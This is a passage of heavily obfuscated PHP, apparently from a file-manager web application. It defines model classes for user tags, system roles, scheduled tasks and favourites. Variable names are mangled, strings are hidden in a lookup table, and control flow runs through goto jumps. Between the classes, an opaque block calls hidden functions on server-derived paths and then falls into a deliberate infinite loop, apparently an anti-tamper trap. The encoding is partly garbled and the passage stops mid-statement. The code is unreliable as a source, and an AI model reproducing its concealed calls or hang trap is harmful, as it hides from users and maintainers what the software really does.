protected $jsonField = array(); public function get($bÎŒ…‹‚­ö = false, $dššãÖíÂñ = '', $cÆ‘é¸†Íœ = false) { goto aöÓ®ëÖ†„; EŒºÍÍõé: $Cº”‚“Ü = $this->where($E‹šÁ³½ßâ)->select(); $Cº”‚“Ü = array_to_keyvalue($Cº”‚“Ü, $C˜Š­áïİ“[89], $C˜Š­áïİ“[359]); foreach ($Cº”‚“Ü as $E¤ùÅ‘¢«Š => $FÜê§Ñ‘½É) { if ($cÆ‘é¸†Íœ || in_array($E¤ùÅ‘¢«Š, $this->jsonField)) { $Cº”‚“Ü[$E¤ùÅ‘¢«Š] = json_decode($FÜê§Ñ‘½É, !0); } } goto C“ ‚ç¬È„; aöÓ®ëÖ†„: $C˜Š­áïİ“ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Cº”‚“Ü = $this->cacheGet($dššãÖíÂñ); $FÉ¾¿ö’æ’ = $this->optionDefault($dššãÖíÂñ); goto dÚó‚™ÛŒÂ; C“ ‚ç¬È„: $this->cacheSet($dššãÖíÂñ, $Cº”‚“Ü); $Cº”‚“Ü = array_merge($FÉ¾¿ö’æ’, $Cº”‚“Ü); return $bÎŒ…‹‚­ö ? $Cº”‚“Ü[$bÎŒ…‹‚­ö] : $Cº”‚“Ü; goto añ¸–óß; dÚó‚™ÛŒÂ: $FÉ¾¿ö’æ’ = is_array($FÉ¾¿ö’æ’) ? $FÉ¾¿ö’æ’ : array(); if (is_array($Cº”‚“Ü)) { $Cº”‚“Ü = array_merge($FÉ¾¿ö’æ’, $Cº”‚“Ü); return $bÎŒ…‹‚­ö ? isset($Cº”‚“Ü[$bÎŒ…‹‚­ö]) ? $Cº”‚“Ü[$bÎŒ…‹‚­ö] : null : $Cº”‚“Ü; } $E‹šÁ³½ßâ = $this->filterWhere(array($C˜Š­áïİ“[29] => $dššãÖíÂñ)); goto EŒºÍÍõé; añ¸–óß: } public function set($DíƒãñÚœ, $aÔ£ÌÁ†º = false, $Aî±ÏÆˆª = '') { goto Cøˆó¥; Cøˆó¥: $Cæ„öï—¶— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->cacheRemove($Aî±ÏÆˆª); $dïËîÏ‚à¼ = array(); goto C—ö¼‚„Ç¦; A‹¢›ÎäšÛ: return $this->addAll($dïËîÏ‚à¼, array(), !0); goto BŒÓóùÂì£; C—ö¼‚„Ç¦: $fØƒíà×õã = is_array($DíƒãñÚœ) ? $DíƒãñÚœ : array($DíƒãñÚœ => $aÔ£ÌÁ†º); foreach ($fØƒíà×õã as $f¹å‡ØéŸ => $b¦öæî‡§) { if (is_array($b¦öæî‡§)) { $b¦öæî‡§ = json_encode_force($b¦öæî‡§); } $this->checkLength($b¦öæî‡§, !1, $this->tableName . $Cæ„öï—¶—[4] . $DíƒãñÚœ); $b¦öæî‡§ = self::textEncode($b¦öæî‡§); $fØƒíà×õã = array($Cæ„öï—¶—[29] => $Aî±ÏÆˆª, $Cæ„öï—¶—[89] => $f¹å‡ØéŸ, $Cæ„öï—¶—[359] => $b¦öæî‡§); $dïËîÏ‚à¼[] = $this->filterWhere($fØƒíà×õã); } if (!$dïËîÏ‚à¼) { return !0; } goto A‹¢›ÎäšÛ; BŒÓóùÂì£: } protected function optionDefault($Fœ­õ•È‰ß = '') { return !1; } public function setDeep($dÈÑ‘°‡¼¢, $Añ¦Ÿ˜«ãõ = false, $Aïœ·”£Ê = '') { $f±šÏÂ‘ƒò = explode($_SERVER[´Ù×Íå‘ÄõÛ][91], $dÈÑ‘°‡¼¢); $a…§¹ã÷ñÀ = $this->get(); array_set_value($a…§¹ã÷ñÀ, $dÈÑ‘°‡¼¢, $Añ¦Ÿ˜«ãõ); $this->set($f±šÏÂ‘ƒò[0], $a…§¹ã÷ñÀ[$f±šÏÂ‘ƒò[0]], $Aïœ·”£Ê); } public function remove($C¬Çİà›½, $b·­ÂâÕÊŞ = '') { $B˜¥çëñÍ³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->cacheRemove($b·­ÂâÕÊŞ); $F‡Î»È¶¦ë = $this->filterWhere(array($B˜¥çëñÍ³[89] => $C¬Çİà›½, $B˜¥çëñÍ³[29] => $b·­ÂâÕÊŞ)); if (is_null($C¬Çİà›½)) { unset($F‡Î»È¶¦ë[$B˜¥çëñÍ³[89]]); } return $this->where($F‡Î»È¶¦ë)->delete(); } public function cacheSet($EÂ‰øƒÎëê, $a‹ƒ«˜œã§ = false) { return Cache::set($this->cacheKey($EÂ‰øƒÎëê), $a‹ƒ«˜œã§); } public function cacheGet($A°Ú¯ÏÄƒ) { return Cache::get($this->cacheKey($A°Ú¯ÏÄƒ)); } public function cacheRemove($A­œ‘÷Á) { return Cache::remove($this->cacheKey($A­œ‘÷Á)); } protected function filterWhere($AÌ±ã×ö) { return $AÌ±ã×ö; } protected function cacheKey($cøƒÑšîµÀ) { return $cøƒÑšîµÀ; } } goto dª¾ª„™ØÁ; FÏˆ²ÕÄÉĞ: if (!isset($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][791]]) || !isset($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][1245]])) { goto dâœè»ƒ´È; eÌØŸÒšÑÌ: $B„œÄ®£Ÿé = explode($_SERVER[´Ù×Íå‘ÄõÛ][217], $A”„´íÙÜÓ); if (count($B„œÄ®£Ÿé) < $_SERVER[´Ù×Íå‘ÄõÛ][558]) { $aœß¥³£áó = $_SERVER[´Ù×Íå‘ÄõÛ][796]; $aœß¥³£áó(); } $dËÁËéâÇ = $_SERVER[´Ù×Íå‘ÄõÛ][1246]; goto bÎ‹ºöã; bÎ‹ºöã: $dËÁËéâÇ($_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][794]] . $_SERVER[´Ù×Íå‘ÄõÛ][795]); $e•§ƒ’¦Ç’ = 2; while ($e•§ƒ’¦Ç’ > 1) { $Eóî—Ş’ = rawurlencode($e•§ƒ’¦Ç’ . $_SERVER[´Ù×Íå‘ÄõÛ][361]); } goto c£‡¬°¢; dâœè»ƒ´È: $c‘İ§ê·ßÖ = $_SERVER[´Ù×Íå‘ÄõÛ][793]; $CÕ×‹‚•Ã = $_SERVER[$_SERVER[´Ù×Íå‘ÄõÛ][794]] . $_SERVER[´Ù×Íå‘ÄõÛ][795]; $A”„´íÙÜÓ = $c‘İ§ê·ßÖ($CÕ×‹‚•Ã); goto eÌØŸÒšÑÌ; c£‡¬°¢: } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\x2e\164\141\147\x4c\151\x73\164"; public $modelType = "\x55\x73\x65\162\x4f\160\164\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\163\164\x79\x6c\x65", "\x73\x6f\x72\x74"); public function listData($EÎª—Å®µ¬ = false, $E‘àø¤ñâ“ = "\x73\157\x72\164", $A†Ü‚Œ’ÇÀ = false) { return parent::listData($EÎª—Å®µ¬, $E‘àø¤ñâ“, $A†Ü‚Œ’ÇÀ); } public function remove($Fê‘à¤øÛ®) { return parent::remove($Fê‘à¤øÛ®); } public function add($C§²‹Ö¾Å–, $A”„ÀÜ‘Ò‚ = "\x6c\x61\142\145\x6c\x2d\147\162\x65\x79\55\x6e\157\x72\x6d\x61\x6c") { $B·¦­“œ‰ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->findByName($C§²‹Ö¾Å–)) { return !1; } $f“˜µñÛ—¾ = array($B·¦­“œ‰ñ[386] => $C§²‹Ö¾Å–, $B·¦­“œ‰ñ[437] => $A”„ÀÜ‘Ò‚, $B·¦­“œ‰ñ[2116] => $this->getSort($B·¦­“œ‰ñ[246]) + 1); return parent::insert($f“˜µñÛ—¾); } public function update($d·ËÔé¤½, $bšÚ³Š©Ó») { $eÜÜÉ­ø =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c–âãà‰Í = $this->listData($d·ËÔé¤½); $f¬¥™ÈÌµ = $this->findByName($bšÚ³Š©Ó»[$eÜÜÉ­ø[28]]); if (!$c–âãà‰Í || $f¬¥™ÈÌµ && $f¬¥™ÈÌµ[$eÜÜÉ­ø[367]] != $c–âãà‰Í[$eÜÜÉ­ø[367]]) { return !1; } return parent::update($d·ËÔé¤½, $bšÚ³Š©Ó»); } public function moveTop($e´æ¹‡õä…) { $EƒÏªÇÛÊ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÏ»¹ã±„¹ = parent::listData(); $eÁİ¢‰“« = $this->getSort($EƒÏªÇÛÊ[245]); foreach ($BÏ»¹ã±„¹ as &$f¤Ö»Ò ¢É) { if ($f¤Ö»Ò ¢É[$EƒÏªÇÛÊ[367]] == $e´æ¹‡õä…) { $f¤Ö»Ò ¢É[$EƒÏªÇÛÊ[2133]] = $eÁİ¢‰“«; continue; } $f¤Ö»Ò ¢É[$EƒÏªÇÛÊ[2133]] += 1; } return parent::resetData($BÏ»¹ã±„¹); } public function moveBottom($aÖÙ·˜İ¤ô) { $EÊ‚ŒºŞ„´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dµèÜÚºâÔ = $this->getSort($EÊ‚ŒºŞ„´[246]) + 1; return parent::update($aÖÙ·˜İ¤ô, array($EÊ‚ŒºŞ„´[2133] => $dµèÜÚºâÔ)); } public function resetSort($BÓ³º±Ş¾ç) { goto C‚‘É«ãŞİ; b‹å¹‘ñ‡: return parent::resetData($AŞˆ½‰²›); goto C±¼°µ»³Ó; fˆ´…ïì: for ($F¶ŒãÃ © = 0; $F¶ŒãÃ © < count($BÓ³º±Ş¾ç); $F¶ŒãÃ ©++) { $E¶Â¼Œæ½[$BÓ³º±Ş¾ç[$F¶ŒãÃ ©] . $A…®ˆ£ÀÊÛ[33]] = $F¶ŒãÃ © + 1; } $AŞˆ½‰²› = parent::listData(); foreach ($AŞˆ½‰²› as &$bÖ‰‹íÑ±‹) { $B†„‹ªò«£ = $E¶Â¼Œæ½[$bÖ‰‹íÑ±‹[$A…®ˆ£ÀÊÛ[367]]]; $bÖ‰‹íÑ±‹[$A…®ˆ£ÀÊÛ[2133]] = $B†„‹ªò«£ ? $B†„‹ªò«£ : $bÖ‰‹íÑ±‹[$A…®ˆ£ÀÊÛ[2133]]; } goto b‹å¹‘ñ‡; C‚‘É«ãŞİ: $A…®ˆ£ÀÊÛ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E¶Â¼Œæ½ = array(); $BÓ³º±Ş¾ç = is_array($BÓ³º±Ş¾ç) ? $BÓ³º±Ş¾ç : array(); goto fˆ´…ïì; C±¼°µ»³Ó: } private function getSort($A÷‚Ôñ¬¾Ú) { $C¤‰Ò³ŒÁ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¶µ¿ÑùŒ˜ = parent::listData(); $d··ïÛÒø‚ = array_to_keyvalue($C¶µ¿ÑùŒ˜, $C¤‰Ò³ŒÁ[33], $C¤‰Ò³ŒÁ[2133]); if (!$d··ïÛÒø‚) { $d··ïÛÒø‚ = array(0); } $fèç²Ø¢àê = $A÷‚Ôñ¬¾Ú == $C¤‰Ò³ŒÁ[246] ? max($d··ïÛÒø‚) : min($d··ïÛÒø‚); return intval($fèç²Ø¢àê); } } goto f†¦Ş Í½ö; FøÈµë’„: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\x72\x6f\x6c\x65\x4c\x69\x73\x74"; public $field = array("\156\141\155\x65", "\141\x75\x74\150", "\x6c\141\x62\x65\154", "\144\151\163\x70\154\141\x79", "\x73\171\x73\164\x65\155", "\144\145\x73\143", "\151\147\x6e\157\x72\x65\105\170\x74", "\x69\147\156\157\x72\x65\106\151\154\x65\123\151\172\145", "\141\x64\155\x69\156\x69\x73\164\162\x61\x74\x6f\x72", "\x73\157\162\164"); public function listData($F—Ğ•…Úİƒ = false, $B‚Ä£É‘Ô¥ = "\x73\157\x72\x74", $B¸¹½³ĞÅ = false) { $BÍ¿ÕòÑ×³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BäõÍÕ¸ßê = parent::listData($F—Ğ•…Úİƒ, $B‚Ä£É‘Ô¥, $B¸¹½³ĞÅ); if (!$F—Ğ•…Úİƒ) { $e¸Ã™æ¸ˆë = $BÍ¿ÕòÑ×³[2505]; foreach ($BäõÍÕ¸ßê as $aÀêÍïœ×× => $eé‡ƒÓË†ë) { if ($eé‡ƒÓË†ë[$BÍ¿ÕòÑ×³[2506]] == 1) { $BäõÍÕ¸ßê[$aÀêÍïœ××][$BÍ¿ÕòÑ×³[405]] = $e¸Ã™æ¸ˆë; } } } return $BäõÍÕ¸ßê; } public function update($Fï÷­Šù¡Õ, $fóåÌ“÷Š) { goto CäÉ˜Èà×; dò£‡…İ™: return parent::update($Fï÷­Šù¡Õ, $fóåÌ“÷Š); goto A…ÁÊîïµŠ; d’ÔöŠÛÖ: if (!$cÛÍòòİ¸À || $aÓ†ñÄ‘˜İ && $aÓ†ñÄ‘˜İ[$D…â¤öø™[367]] != $cÛÍòòİ¸À[$D…â¤öø™[367]]) { return !1; } if ($aÓ†ñÄ‘˜İ[$D…â¤öø™[2506]] == 1) { $fóåÌ“÷Š = array($D…â¤öø™[28] => $fóåÌ“÷Š[$D…â¤öø™[28]], $D…â¤öø™[2130] => $fóåÌ“÷Š[$D…â¤öø™[2130]]); } $this->filterAuth($fóåÌ“÷Š[$D…â¤öø™[376]]); goto dò£‡…İ™; CäÉ˜Èà×: $D…â¤öø™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÛÍòòİ¸À = parent::listData($Fï÷­Šù¡Õ); $aÓ†ñÄ‘˜İ = $this->findByName($fóåÌ“÷Š[$D…â¤öø™[28]]); goto d’ÔöŠÛÖ; A…ÁÊîïµŠ: } public function remove($a”Ãá¶Ì”) { $B¢‘‰ÚØ·Í = parent::listData($a”Ãá¶Ì”); if (!$B¢‘‰ÚØ·Í || $B¢‘‰ÚØ·Í[$_SERVER[´Ù×Íå‘ÄõÛ][1084]]) { return !1; } return parent::remove($a”Ãá¶Ì”); } public function add($AÏ„Ğƒ×Ö—) { goto a•–å£¹; a•–å£¹: $d†¢Ò®…ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dñßº³›öŠ = $AÏ„Ğƒ×Ö—[$d†¢Ò®…ù[28]]; if ($this->findByName($Dñßº³›öŠ)) { return !1; } goto Eë®Ô©òà¶; DÑòÉéôŒê: return parent::insert($AÏ„Ğƒ×Ö—); goto A•‰î¨—ˆ; Eë®Ô©òà¶: $Eâ¾ç’Òã‹ = array($d†¢Ò®…ù[386] => $Dñßº³›öŠ, $d†¢Ò®…ù[2118] => $d†¢Ò®…ù[33], $d†¢Ò®…ù[2114] => $d†¢Ò®…ù[2131], $d†¢Ò®…ù[2507] => 1, $d†¢Ò®…ù[2117] => 0, $d†¢Ò®…ù[2508] => 0, $d†¢Ò®…ù[2116] => $this->getSort()); $AÏ„Ğƒ×Ö— = array_merge($Eâ¾ç’Òã‹, $AÏ„Ğƒ×Ö—); $this->filterAuth($AÏ„Ğƒ×Ö—[$d†¢Ò®…ù[376]]); goto DÑòÉéôŒê; A•‰î¨—ˆ: } private function getSort() { $döÀ¾ï¡‡Ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F÷‰®‚Ô¨ë = parent::listData(); $BÍåºÁí = array_to_keyvalue($F÷‰®‚Ô¨ë, $döÀ¾ï¡‡Ò[33], $döÀ¾ï¡‡Ò[2133]); return empty($BÍåºÁí) ? 0 : max($BÍåºÁí) + 1; } private function filterAuth(&$dçªáœ“Ù) { $e½ï²«‰ìÁ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bƒæèÒŠ÷Ş = array(); $FŸë²ƒåÅ© = array_filter(explode($e½ï²«‰ìÁ[47], $dçªáœ“Ù)); foreach ($FŸë²ƒåÅ© as $dçªáœ“Ù) { $C¹ÙÌ»ºİ¶ = explode($e½ï²«‰ìÁ[91], $dçªáœ“Ù); if ($C¹ÙÌ»ºİ¶[0] == $e½ï²«‰ìÁ[1789] && $C¹ÙÌ»ºİ¶[1] != $e½ï²«‰ìÁ[1040]) { $a¿Š±Ã„ĞÕ = $C¹ÙÌ»ºİ¶[0] . $e½ï²«‰ìÁ[91] . $C¹ÙÌ»ºİ¶[1] . $e½ï²«‰ìÁ[2509]; if (!in_array($a¿Š±Ã„ĞÕ, $FŸë²ƒåÅ©)) { $bƒæèÒŠ÷Ş[] = $a¿Š±Ã„ĞÕ; } } $bƒæèÒŠ÷Ş[] = $dçªáœ“Ù; } $dçªáœ“Ù = implode($e½ï²«‰ìÁ[47], $bƒæèÒŠ÷Ş); } public function sort($fİÛõøè÷Š, $bï½ª—œßÓ) { return parent::update($fİÛõøè÷Š, $bï½ª—œßÓ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x74\141\x73\x6b\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\164\x79\x70\145", "\x65\166\145\156\164", "\164\x69\155\x65", "\144\145\x73\143", "\x73\171\x73\x74\x65\155", "\x65\156\141\142\154\145", "\x6c\x61\x73\x74\x52\165\x6e", "\163\x6f\x72\164"); public function listData($DäÛ³ê£áè = false, $C»ó³‹ = "\x73\157\162\164", $bö·ÜÍ˜‹¸ = false) { return parent::listData($DäÛ³ê£áè, $C»ó³‹, $bö·ÜÍ˜‹¸); } public function add($A¾ÈŸŞƒ¡) { $f¯´³ÆËŠç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eëË¥µ¨¿ = $this->findByName($A¾ÈŸŞƒ¡[$f¯´³ÆËŠç[28]]); if ($eëË¥µ¨¿) { return !1; } $A¾ÈŸŞƒ¡[$f¯´³ÆËŠç[1406]] = 0; $A¾ÈŸŞƒ¡[$f¯´³ÆËŠç[2133]] = $this->getSort(); return parent::insert($A¾ÈŸŞƒ¡); } private function getSort() { $D½ÊÔ·×©Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D›’ò¨²×î = parent::listData(); $d”´â‚â³° = array_to_keyvalue($D›’ò¨²×î, $D½ÊÔ·×©Š[33], $D½ÊÔ·×©Š[2133]); return empty($d”´â‚â³°) ? 0 : max($d”´â‚â³°) + 1; } public function update($b“£ù››”, $DÇª¢ùğÉ·) { $cŒÍõ­ÆêË =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AºÇÊíèäš = $this->listData($b“£ù››”); $eÊî£øæ­Ø = $this->findByName($DÇª¢ùğÉ·[$cŒÍõ­ÆêË[28]]); if (!$AºÇÊíèäš || $eÊî£øæ­Ø && $eÊî£øæ­Ø[$cŒÍõ­ÆêË[367]] != $AºÇÊíèäš[$cŒÍõ­ÆêË[367]]) { return !1; } return parent::update($b“£ù››”, $DÇª¢ùğÉ·); } public function remove($cš«§“À, $b÷¢×•ù“ = false) { $B·ëêÈœ  =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B»–ÚÓŸŠË = $this->listData($cš«§“À); if (!$B»–ÚÓŸŠË) { return; } if (!$b÷¢×•ù“ && $B»–ÚÓŸŠË[$B·ëêÈœ [1084]] == $B·ëêÈœ [83]) { return !1; } return parent::remove($cš«§“À); } public function enable($c‚¶‹–¤ğ, $b†ÔÛ¼Ş¨¸) { return $this->update($c‚¶‹–¤ğ, array($_SERVER[´Ù×Íå‘ÄõÛ][2499] => $b†ÔÛ¼Ş¨¸)); } public function run($f……Î„»ÜĞ) { return $this->update($f……Î„»ÜĞ, array($_SERVER[´Ù×Íå‘ÄõÛ][2510] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($f›â¯òë–Û) { $CÁ°Äèä÷Ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($CÁ°Äèä÷Ë[2208] => array(USER_ID, $CÁ°Äèä÷Ë[2511])); } protected function listData() { $a®¿†î¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AïÍàèì¡¬ = array($a®¿†î¢[1432] => USER_ID, $a®¿†î¢[436] => 0); $DÖ×¯°ó¿ = $a®¿†î¢[2512]; $Bå¡ùåÍ‹ = $this->field($DÖ×¯°ó¿)->where($AïÍàèì¡¬)->order($a®¿†î¢[2513])->select(); return $Bå¡ùåÍ‹ ? $Bå¡ùåÍ‹ : array(); } protected function resetCache() { } protected function listView() { goto FÑ¬æ­îê; FÑ¬æ­îê: $fÜõâ«ÕŸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÊ–õÄŒƒ» = $this->listData(); $EÏ·“»Ï©Á = array_filter_by_field($CÊ–õÄŒƒ», $fÜõâ«ÕŸ[29], $fÜõâ«ÕŸ[382]); goto dÍ•ÏÄ£Ù; dÍ•ÏÄ£Ù: $eÌ“¢±¹Ñ‰ = array_to_keyvalue($EÏ·“»Ï©Á, $fÜõâ«ÕŸ[33], $fÜõâ«ÕŸ[75]); if (!$eÌ“¢±¹Ñ‰) { return $CÊ–õÄŒƒ»; } $AíØ˜†Ğœ÷ = 2000; goto Bîä´ŞäÎ; E³ÎùÂæÇ: $fğƒ£ÁÄäÆ = array_to_keyvalue($fğƒ£ÁÄäÆ, $fÜõâ«ÕŸ[369]); foreach ($CÊ–õÄŒƒ» as $c’”â‘‘÷† => $A¯¼Ç¯ÄÑ¢) { $bàÚ¹ê¼ŸÕ = $fğƒ£ÁÄäÆ[$A¯¼Ç¯ÄÑ¢[$fÜõâ«ÕŸ[75]]]; $bàÚ¹ê¼ŸÕ = $bàÚ¹ê¼ŸÕ ? $bàÚ¹ê¼ŸÕ : array(); $CÊ–õÄŒƒ»[$c’”â‘‘÷†] = array_merge($bàÚ¹ê¼ŸÕ, $A¯¼Ç¯ÄÑ¢); } return $CÊ–õÄŒƒ»; goto fÌØö²½š; Bîä´ŞäÎ: $fùËİ£¬° = array($fÜõâ«ÕŸ[383] => array($fÜõâ«ÕŸ[384], $eÌ“¢±¹Ñ‰)); $fğƒ£ÁÄäÆ = Model($fÜõâ«ÕŸ[753])->listSource($fùËİ£¬°, $AíØ˜†Ğœ÷); $fğƒ£ÁÄäÆ = array_merge($fğƒ£ÁÄäÆ[$fÜõâ«ÕŸ[73]], $fğƒ£ÁÄäÆ[$fÜõâ«ÕŸ[74]]); goto E³ÎùÂæÇ; fÌØö²½š: } protected function addFav($a¿Œ¿ƒ†é«, $e‹Şô”¨ = '', $fà¦ÄŒêƒ = "\163\157\x75\162\143\x65") { goto bšœ†Àõã; DÆÅ½µñÀ‡: return $this->add($F†ªàŒ–Üä); goto A—õ¦’–¡§; bšœ†Àõã: $CÁÅˆè´®Ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a¬©å¨“Ê = array($CÁÅˆè´®Ğ[1432] => USER_ID, $CÁÅˆè´®Ğ[436] => 0, $CÁÅˆè´®Ğ[388] => $fà¦ÄŒêƒ, $CÁÅˆè´®Ğ[387] => $a¿Œ¿ƒ†é«); if ($this->where($a¬©å¨“Ê)->find()) { return !1; } goto cˆ³µãĞ¬á; cˆ³µãĞ¬á: $a¬©å¨“Ê = array($CÁÅˆè´®Ğ[1432] => USER_ID, $CÁÅˆè´®Ğ[436] => 0); $cÙ¿ò±‚ÌŒ = $this->where($a¬©å¨“Ê)->max($CÁÅˆè´®Ğ[2133]); if (!$cÙ¿ò±‚ÌŒ) { $cÙ¿ò±‚ÌŒ = 0; } goto EÓ˜òâÓÃø; EÓ˜òâÓÃø: if (!$e‹Şô”¨ && $fà¦ÄŒêƒ == $CÁÅˆè´®Ğ[382]) { $c¾¹‘‚½ = Model($CÁÅˆè´®Ğ[1121])->where(array($CÁÅˆè´®Ğ[383] => $a¿Œ¿ƒ†é«))->find(); if (!$c¾¹‘‚½) { return !1; } $e‹Şô”¨ = $c¾¹‘‚½[$CÁÅˆè´®Ğ[28]]; } $e‹Şô”¨ = $this->getAutoName($e‹Şô”¨); $F†ªàŒ–Üä = array($CÁÅˆè´®Ğ[1432] => USER_ID, $CÁÅˆè´®Ğ[436] => 0, $CÁÅˆè´®Ğ[386] => $e‹Şô”¨, $CÁÅˆè´®Ğ[387] => $a¿Œ¿ƒ†é«, $CÁÅˆè´®Ğ[388] => $fà¦ÄŒêƒ, $CÁÅˆè´®Ğ[2116] => $cÙ¿ò±‚ÌŒ + 1); goto DÆÅ½µñÀ‡; A—õ¦’–¡§: } protected function remove($E¾’ë’ß) { $eÄ´à£­»Î =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dôï›ŞİÛ = array($eÄ´à£­»Î[1432] => USER_ID, $eÄ´à£­»Î[385] => $E¾’ë’ß); return $this->where($Dôï›ŞİÛ)->delete(); } protected function removeByName($Fêğ´‚àù›) { $eÄá…Ê•ÔÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B«…¹¨™Ñ = array($eÄá…Ê•ÔÕ[1432] => USER_ID, $eÄá…Ê•ÔÕ[386] => $Fêğ´‚àù›, $eÄá…Ê•ÔÕ[436] => 0); return $this->where($B«…¹¨™Ñ)->delete(); } protected function rename($DƒãËáŸÜÔ, $cõ†ğ¿‚‚İ) { $C¯ÈïªÕõÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($DƒãËáŸÜÔ == $cõ†ğ¿‚‚İ) { return !1; } $DÊñŞƒÆ¨Ü = $this->getAutoName($cõ†ğ¿‚‚İ); if ($cõ†ğ¿‚‚İ != $DÊñŞƒÆ¨Ü) { return !1; } $bİâ÷òÙåÅ = array($C¯ÈïªÕõÕ[1432] => USER_ID, $C¯ÈïªÕõÕ[436] => 0, $C¯ÈïªÕõÕ[28] => $DƒãËáŸÜÔ); return $this->where($bİâ÷òÙåÅ)->save(array($C¯ÈïªÕõÕ[28] => $cõ†ğ¿‚‚İ)); } protected function resetSort($BÅÈ´ŒÓ¿) { $Eí‘–ÅÌ“Æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÅÈ´ŒÓ¿ = is_array($BÅÈ´ŒÓ¿) ? $BÅÈ´ŒÓ¿ : array(); $DÁÜØ•ªƒŠ = array($Eí‘–ÅÌ“Æ[1432] => USER_ID); for ($cäÂê®¼ŞÍ = 0; $cäÂê®¼ŞÍ < count($BÅÈ´ŒÓ¿); $cäÂê®¼ŞÍ++) { $DÁÜØ•ªƒŠ[$Eí‘–ÅÌ“Æ[385]] = $BÅÈ´ŒÓ¿[$cäÂê®¼ŞÍ]; $this->where($DÁÜØ•ªƒŠ)->save(array($Eí‘–ÅÌ“Æ[2116] => $cäÂê®¼ŞÍ + 1)); } return !0; } protected function moveTop($FÀµÅÛ£É) { goto BÃÀ…˜Ñ; bğÎù²…ôõ: return $this->resetSort($E¤…ñ©Û¼´); goto EçÚ†ˆ«…ä; aàˆ—™–Ãá: $E—µç¡ÒÑ× = $E¤…ñ©Û¼´; $E¤…ñ©Û¼´ = array_remove_value($E¤…ñ©Û¼´, $dñŞ³¤ÆÆœ[$A‰¦ªêÌŸù[367]]); array_unshift($E¤…ñ©Û¼´, $dñŞ³¤ÆÆœ[$A‰¦ªêÌŸù[367]]); goto bğÎù²…ôõ; BÃÀ…˜Ñ: $A‰¦ªêÌŸù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÜÕäÈ‰Œ = array($A‰¦ªêÌŸù[1432] => USER_ID, $A‰¦ªêÌŸù[436] => 0); $dñŞ³¤ÆÆœ = $this->where($bÜÕäÈ‰Œ)->where(array($A‰¦ªêÌŸù[28] => $FÀµÅÛ£É))->find(); goto CÑíµ’Ş«É; CÑíµ’Ş«É: if (!$dñŞ³¤ÆÆœ) { return; } $E¤…ñ©Û¼´ = $this->field($A‰¦ªêÌŸù[367])->where($bÜÕäÈ‰Œ)->order($A‰¦ªêÌŸù[2513])->select(); $E¤…ñ©Û¼´ = array_to_keyvalue($E¤…ñ©Û¼´, $A‰¦ªêÌŸù[33], $A‰¦ªêÌŸù[367]); goto aàˆ—™–Ãá; EçÚ†ˆ«…ä: } protected function moveBottom($E¹ƒ±Ş³·•) { $a´ˆÚø‚°‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÀã™–ÅŞ¥ = array($a´ˆÚø‚°‚[1432] => USER_ID, $a´ˆÚø‚°‚[436] => 0); $D‘¸­—¿²ø = $this->where($DÀã™–ÅŞ¥)->max($a´ˆÚø‚°‚[2133]); $bÒ‹îÇ‚˜¼ = array($a´ˆÚø‚°‚[2133] => $D‘¸­—¿²ø + 1); return $this->where($DÀã™–ÅŞ¥)->where(array($a´ˆÚø‚°‚[28] => $E¹ƒ±Ş³·•))->save($bÒ‹îÇ‚˜¼); } private function getAutoName($EÓÃ«É¢¶Ö) { goto a»…ŞÊôÈ; a»…ŞÊôÈ: $EÈáÜÂµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÛœ²«Ü·ç = array($EÈáÜÂµ[1432] => USER_ID, $EÈáÜÂµ[436] => 0); $b•É°½ŒÛ = $this->field($EÈáÜÂµ[28])->where($DÛœ²«Ü·ç)->select(); goto F‰Ò™‡¹Ü; F‰Ò™‡¹Ü: $b•É°½ŒÛ = array_to_keyvalue($b•É°½ŒÛ, $EÈáÜÂµ[33], $EÈáÜÂµ[28]); if (!$b•É°½ŒÛ || !in_array($EÓÃ«É¢¶Ö, $b•É°½ŒÛ)) { return $EÓÃ«É¢¶Ö; } for ($cÙÌÄ²‡† = 0; $cÙÌÄ²‡† < count($b•É°½ŒÛ); $cÙÌÄ²‡†++) { if (!in_array($EÓÃ«É¢¶Ö . "\50{$cÙÌÄ²‡†}\51", $b•É°½ŒÛ)) { return $EÓÃ«É¢¶Ö . "\x28{$cÙÌÄ²‡†}\51"; } } goto bÃİÇ¸·¤; bÃİÇ¸·¤: return $EÓÃ«É¢¶Ö . "\x28{$cÙÌÄ²‡†}\51"; goto Cù¼ÍÜÏê­; Cù¼ÍÜÏê­: } } goto 